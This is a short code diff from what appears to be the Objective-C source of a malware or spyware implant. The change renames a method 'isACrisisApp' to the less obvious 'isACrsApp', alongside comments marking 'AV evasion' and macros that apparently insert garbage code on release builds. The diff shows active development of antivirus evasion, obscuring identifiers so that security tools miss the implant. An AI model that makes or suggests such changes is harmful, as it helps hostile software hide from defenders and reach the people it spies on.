@@ -471,7 +471,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     }
 }
 
-+ (BOOL)isACrisisApp
++ (BOOL)isACrsApp
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
@@ -638,7 +638,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
     // AV evasion: only on release build
     AV_GARBAGE_003 
 
-    if ([self isACrisisApp])
+    if ([self isACrsApp])
     {   
       // AV evasion: only on release build
       AV_GARBAGE_004 
